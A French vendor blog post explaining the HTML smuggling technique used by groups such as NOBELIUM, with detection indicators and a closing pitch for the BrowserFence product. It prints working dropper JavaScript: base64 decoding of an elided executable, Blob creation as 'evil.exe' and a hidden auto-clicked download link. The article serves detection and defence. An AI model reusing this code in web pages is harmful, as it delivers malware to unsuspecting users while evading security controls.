+++
title = 'Détection du HTML Smuggling'
date = 2024-06-21T17:04:20+02:00
draft = false
image = '/posts/html-smuggling/static/html-smuggling.png'
+++

## Introduction

Le HTML smuggling est une technique avancée et furtive qui exploite les fonctionnalités standard de HTML5 et de JavaScript pour éviter la détection et distribuer des chevaux de Troie d'accès à distance (RAT), des malwares bancaires et d'autres logiciels malveillants. Cette méthode est de plus en plus adoptée par des groupes de hackers soutenus par des États et des cybercriminels pour infiltrer les gouvernements, les individus et les entreprises. Un exemple notable est le groupe NOBELIUM, que l'on pense être lié à la Russie, et qui a utilisé le HTML smuggling pour cibler des organisations gouvernementales et diplomatiques à travers le monde. Les chercheurs de Microsoft ont observé que le groupe NOBELIUM a utilisé des pièces jointes HTML malveillantes dans une campagne appelée EnvyScout. Ces pièces jointes agissent comme des dropper, capables de déchiffrer et d'écrire des fichiers ISO malveillants sur le système de la victime.

## Comment fonctionne le HTML Smuggling

Ce malware est essentiellement utilisé pour prendre le contrôle des machines des victimes, distribuer efficacement des charges utiles et exécuter des attaques de ransomware.

Dans le HTML smuggling, l'attaquant utilise une pièce jointe HTML spécialement conçue qui contient un script malveillant encodé. Lorsque la victime ouvre ce fichier HTML malveillant dans son navigateur, le navigateur décode ce script malveillant intégré qui, lors de l'exécution, assemble ensuite la charge utile sur la machine de la victime. L'avantage principal pour les acteurs malveillants est que, au lieu de transmettre la charge utile sur le réseau, celle-ci s'assemble directement sur la machine de la victime. Cela rend la technique hautement évasive car elle peut contourner les contrôles de sécurité standard tels que les proxies web, les pare-feu et les passerelles de messagerie. Comme la charge utile n'est créée que lorsque le fichier HTML malveillant est chargé sur la machine de la victime via le navigateur, les solutions de sécurité ne voient que du trafic HTML ou JavaScript, qui peut être encore plus obfusqué pour échapper à la détection.

<img src="/posts/html-smuggling/static/HTMLsmuggling-1.jpg" alt="où sont les pièces" style="display: block; margin-left: auto; margin-right: auto; width: 100%; height: auto;">

## Analyse du code

Dans ce chapitre, nous allons analyser une version de base d'une charge utile de HTML smuggling. [voir le code complet](https://github.com/SofianeHamlaoui/Pentest-Notes/blob/master/offensive-security/defense-evasion/file-smuggling-with-html-and-javascript.md)

#### Données encodées en Base64

```javascript
//fonction de conversion
function base64ToArrayBuffer(base64) {
    var binary_string = window.atob(base64);
    var len = binary_string.length;

    var bytes = new Uint8Array(len);
    for (var i = 0; i < len; i++) {
        bytes[i] = binary_string.charCodeAt(i);
    }
    return bytes.buffer;
}

//malware.exe encodé en Base64
var file = 'TVqQAAMAAAAEAAAA//8AALgAA[...]nBkYgA=';
var data = base64ToArrayBuffer(file);
```

Comme nous l'avons observé, le fichier HTML malveillant peut distribuer des malwares sur la machine de la victime via diverses méthodes. Dans ce scénario, la charge utile entière est encodée en base64 et intégrée directement dans le fichier HTML lui-même. On peut voir la variable `file` contenant la charge utile.

La fonction `base64ToArrayBuffer` convertit la charge utile encodée en les octets réels qui composent le fichier malveillant.

Il est important de noter que les attaquants peuvent élaborer des méthodes encore plus complexes pour distribuer des malwares. Par exemple, ils peuvent diviser la charge utile en plusieurs morceaux, récupérer des parties de celle-ci à distance, ou utiliser différents standards de codage et techniques de chiffrement. Ces stratégies augmentent considérablement la probabilité d'échapper aux mesures de sécurité telles que les proxies web, les pare-feu et les passerelles de messagerie.

#### Blob JavaScript

```javascript
var blob = new Blob([data], {type: 'octet/stream'});
var fileName = 'evil.exe';
```

C'est le cœur de l'attaque. L'objet Blob permet de créer un fichier dans le navigateur en utilisant du code JavaScript. Voici comment Mozilla le décrit :

```text
"L'interface Blob représente un blob, qui est un objet similaire à un fichier contenant des données brutes immuables; elles peuvent être lues sous forme de texte ou de données binaires, ou converties en un ReadableStream pour que ses méthodes puissent être utilisées pour traiter les données.
Les blobs peuvent représenter des données qui ne sont pas nécessairement dans un format natif à JavaScript. L'interface File est basée sur Blob, héritant des fonctionnalités de blob et les étendant pour prendre en charge les fichiers sur le système de l'utilisateur."
```

<img src="/posts/html-smuggling/static/blob-struct.png" alt="où sont les pièces" style="display: block; margin-left: auto; margin-right: auto; width: 100%; height: auto;">
<br>
Par conséquent, au lieu de compter sur le serveur web pour livrer un fichier, un Blob peut être créé localement en utilisant JavaScript. Par exemple, un fichier "evil.exe" qui serait typiquement téléchargé depuis un serveur peut être assemblé et téléchargé directement sur le système cible en utilisant une balise anchor HTML avec l'attribut download.

#### Téléchargement via balise HTML anchor

```javascript 
if (window.navigator.msSaveOrOpenBlob) {
    window.navigator.msSaveOrOpenBlob(blob, fileName);
} else {
    var a = document.createElement('a');
    console.log(a);
    document.body.appendChild(a);
    a.style = 'display: none';
    var url = window.URL.createObjectURL(blob);
    a.href = url;
    a.download = fileName;
    a.click();
    window.URL.revokeObjectURL(url);
}
```

Ce fragment de code vérifie si le navigateur prend en charge `msSaveOrOpenBlob`. Si pris en charge (pour les anciennes versions d'Internet Explorer et Microsoft Edge), il l'utilise pour sauvegarder ou ouvrir un objet Blob (blob) avec un nom de fichier spécifié (fileName). Si non pris en charge, il crée un élément `<a>` caché dans le document, configure une URL Blob (url) pour l'objet Blob (blob), assigne l'URL à l'attribut href de l'élément `<a>`, configure l'attribut download pour spécifier le nom du fichier (fileName), simule un clic sur l'élément `<a>` pour déclencher le téléchargement et nettoie en révoquant l'URL Blob (url).

À ce stade, le fichier malveillant est stocké sur la machine de la victime.

### Comportement dans le navigateur

Il est maintenant facile d'imaginer les nombreuses façons dont un attaquant peut concevoir pour récupérer un fichier malveillant et le reconstruire directement sur la machine de la victime. Nous pouvons voir cette étape comme une opération de haut niveau où l'attaquant manipule les encodages, les chaînes de caractères et diverses ressources distantes et intégrées. Cependant, à un moment donné, ils doivent utiliser des API spécifiques du navigateur (opération de bas niveau) pour exécuter l'attaque. C'est là que nous pouvons intervenir et agir!

#### Indicateurs de Compromission (IOC) au niveau du navigateur

Chaque technique laisse des traces, et dans ce cas, nos Indicateurs de Compromission (IOC) sont fournis par l'événement de création du Blob. Cet événement a plusieurs paramètres et options, les plus intéressants étant l'ArrayBuffer, qui contient le malware, et le type, qui doit être défini sur octet/stream.

<img src="/posts/html-smuggling/static/blob-event.png" alt="où sont les pièces" style="display: block; margin-left: auto; margin-right: auto; width: 70%; height: auto;">
<br>
<img src="/posts/html-smuggling/static/buffer-array.png" alt="où sont les pièces" style="display: block; margin-left: auto; margin-right: auto; width: 90%; height: auto;">
<br>
À ce stade, le fichier malveillant ne peut plus être obfusqué, divisé ou modifié d'une autre manière. Il doit être entièrement chargé en mémoire, prêt à être téléchargé. Par conséquent, il est possible de surveiller l'allocation de mémoire et d'identifier ce type de fichier malveillant.

Ensuite, un élément anchor est créé qui pointe vers une URL Blob avec un paramètre de téléchargement et probablement avec un style `display:none`, suivi d'un clic programmatique dessus. Cette séquence d'actions représente un autre comportement spécifique qui peut être identifié et surveillé pour détecter une activité malveillante.

```html
<a href="blob:null/5f2c2f2a-0349-43d2-a6ec-276bd4efb082" download="evil.exe" style="display: none

;"></a>
```

## Conclusion

En conclusion, le HTML smuggling représente une méthode sophistiquée utilisée par les adversaires cybernétiques pour contourner les mesures de sécurité traditionnelles et livrer des charges malveillantes directement aux utilisateurs sans méfiance. En intégrant des scripts encodés dans des fichiers HTML apparemment inoffensifs, les attaquants peuvent échapper à la détection et exécuter des actions malveillantes sur les machines des victimes. Cette technique pose des risques importants pour les individus, les entreprises et les gouvernements à travers le monde.

Chez TeamFence, nous avons mené une analyse approfondie des techniques de HTML smuggling et comprenons l'importance cruciale des mesures de défense proactives. Notre solution est conçue pour détecter et atténuer efficacement ces attaques furtives. En exploitant des algorithmes de détection avancés et des capacités de surveillance en temps réel, BrowserFence identifie les comportements suspects associés au HTML smuggling, tels que la création et la manipulation d'URL Blob et l'assemblage de charges malveillantes en mémoire.

Protégez votre organisation dès aujourd'hui avec BrowserFence et restez en avance dans le paysage en constante évolution des menaces cybernétiques. Contactez-nous pour en savoir plus sur la façon dont BrowserFence peut protéger vos actifs numériques contre le HTML smuggling et garantir un environnement informatique sécurisé pour votre entreprise.

<ul class="pt-4 d-flex gaps g-3 justify-content-center  animated" data-animate="fadeInUp" data-delay=".9">
    <li>
        <a href="#" class="btn btn-md btn-grad" data-overlay="bg-theme-grad-alternet"
           style="position: relative; top: 50px;">Installer BrowserFence</a>
    </li>
</ul>